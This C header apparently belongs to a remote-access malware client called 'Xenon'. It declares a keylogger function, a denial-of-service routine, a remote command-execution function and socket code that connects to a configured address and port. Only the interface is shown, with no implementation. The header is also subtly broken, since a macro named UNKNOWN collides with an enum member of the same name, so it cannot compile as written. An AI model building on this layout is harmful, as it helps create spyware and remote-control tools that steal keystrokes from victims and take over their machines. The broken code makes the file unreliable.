#ifndef CXENONh_H
#define CXENONh_H


#include "../Include/driver/socket.h"

#define Exit -2
#define UNKNOWN 2

#if defined(_WIN32)


int WININIT(void);

char* keylogger(void);
void DOS(void);

enum _USTATUS
{

	ONLINE=0x00,
	OFFLINE=0x01,
	UNKNOWN=0x02

};


#endif

typedef struct
{

	int dstport;
	char* dstaddr;

} ClientCTX, *pClientCTX;

ClientCTX CliInit(pClientCTX CTX);
SOCKET client_socket(SOCKET Socket);
int client_conn(SOCKET Socket);
int execmd(void);

#endif